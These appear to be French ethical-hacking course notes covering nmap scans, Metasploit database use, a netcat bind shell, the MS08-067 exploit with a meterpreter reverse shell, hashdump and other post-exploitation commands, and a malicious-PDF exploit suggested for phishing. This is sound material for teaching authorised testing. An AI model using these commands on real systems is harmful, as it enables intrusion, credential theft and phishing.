- [Utilisation de la base de données](#Utilisation-de-la-base-de-données)
- [Utilisation Métasploit](#Utilisation-Métasploit)
- [Différence entre les payloads type Bind Shell et payloads type reverse shell](#Différence-entre-les-payloads-type-Bind-Shell-et-payloads-type-reverse-shell)

Pour scanner l'adresse IP 192.168.1.12 avec les 1650 ports les plus importants :
```
nmap 192.168.1.12
```

Pour scanner le port 80 de la cible :
```
nmap 192.168.1.12 -p 80
```

Pour scanner le réseau :
```
nmap 192.168.1.0/24
```

Pour détecter les versions et les services :
```
nmap -sV 192.168.0.1
```

Pour effectuer un scan UDP :
```
nmap -sU 192.168.0.1
```

Pour détecter l'OS :
```
nmap -O 192.168.0.1
```
Il existe trois niveau de tests d'intrusion :
1. Le test d'intrusion "boite noire". Il se fonde sur une stratégie totalement réaliste. La société qui vous confie la charge de tester son système d'informations ne vous fournit aucune information. Vous avez tout à découvrir (type d'infrastructure, nb de PC types d'OS, applications utilisées, …)
2. Les tests d'intrusion "boite grise"
3. Les tests d'intrusion "boite blanche"

Les hackeurs éthiques doivent se conformer aux règles suivantes :
➢ Autorisations
➢ motivations
➢ intentions

## Utilisation Métasploit

Executer metasploit console
```
msfconsole
```

Executer metasploit avec interface graphique
```
Armitage
```

Metasploit utilise une BDD, par défaut sur kali on utilise PosgresSQL

```
systemctl start postgresql
```


Pour créer un workspace

```
workspace
```

Pour voir les options de workspace

```
workspace -h
```

Pour switch de workspace

```
workspace [name]
```

Pour ajouter un workspace

```
workspace -a [name]
```
Pour supprimer un workspace

```
workspace -d [name]
```

Pour supprimer tous les workspace

```
workspace -D 
```

Pour renommer un workspace

```
workspace -r <old> <new>
```
Par défault on est sur le dernier workspace utilisé

## Utilisation de la base de données

```
nmap -sS @IP CIBLE -oX scan1.xml
```

Pour vérifier si metasploit est connectée à la BDD

```
db_status
```

Pour importer le résultat d'un NMAP

```
db_import /root/report.xml
```

sinon en utilisant la commande

```
db_nmap -Pn -A 10.102.251.147
```

Afficher les hotes

```
hosts
```

Obtenir de l'aide sur la commande

```
host -h
```

Afficher un hôte en particulier

```
host 192.168.227.132
```

Afficher uniquement les ports 80 et 21 pour l'hôte

```
Services -p 21,80 192.168.227.132
```

Pour tous les hotes

```
Services -p 21,80
```

## Différence entre les payloads type Bind Shell et payloads type reverse shell

- Bind shell la machine de l'attaquant débute la connection
- Reverse shell la machine victime entame la connection

Exemple d'un BIND SHELL

La machine windows execute la commande

```
nc.exe -lvp 4444 -e cmd.exe
```

puis sur la kali

```
nc 192.168.227.134 4444
```

Le reverse shell est utile lorsque la machine victime est derrière un NAT

Exemple d'un REVERSE SHELL

On monte sur notre machine kali une socket TCP 4444 qui se met en attente

```
nc -lvp 4444
```

pour information 
-l (listen) le socket est en attente
-v verbosité
-p le port

Démarche

recherche faillle dans la liste des services

  use faille
  set RHOST
  show options
  show payload
  set payload
  check
  exploit

Pour savoir quel utilisateur est connecté

```
whoami
```

## Sur Windows XP une faille connu

Le port 445 est ouvert -> pour cela il faut faire :

```
search ms08_067
```
```
use 1
```
```
set RHOST -> IP de la machine cible
```
```
set LHOST -> IP de la source
```
```
set LPORT -> Port source :4444
```
```
set RPORT -> Port source :445
```
```
set payload /windows/meterpreter/reverse_tcp
```

Un shell meterpreter s'ouvre

Pour quitter un shell il faut utiliser la commande

```
exit
```
 ## Sur meterpreter 
 
On peut utiliser les commandes suivantes: 

- Pour prendre un screenshot
```
screenshot
```
- Avoir les informations du gestionnaire des taches
```
sysinfo
```
- Obtenir le pid du processsus
```
getpid
```
- Voir le screen de l'utilisateur
```
screenshare
```

Le processus  utilisé est svchost.exe

- Pour savoir l'identité de la personne machine
```
getuid
```
- Pour changer son identité on peut utiliser le mode incognito sur le meterpreter
```
use incognito
```
- Pour retourner à l'état initial
```
rev2self
```
- Pour obtenir le hash de labe des comptes locaux (SAM)
```
hashdump
```
## Utiliser la faille Adobe Reader 9

Chercher l'exploit
```
search adobe pdf
```
```
use 0 
```
Voici les quates options
 - EXENAME : 
 - FILENAME : evil.pdf
 - INFILENAME template.pdf
 - LAUCH_MESSAGE : message d'erreur

Le fichier evil.pdf se trouve dans le dossier /root/.msf4/local/evil.pdf

Il faut désactiver l'antivirus

Ceci peut être utiliser pour faire une attaque via phishing

Efféctué la commande 
```
exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
puis EXPLOIT
```
exploit
```




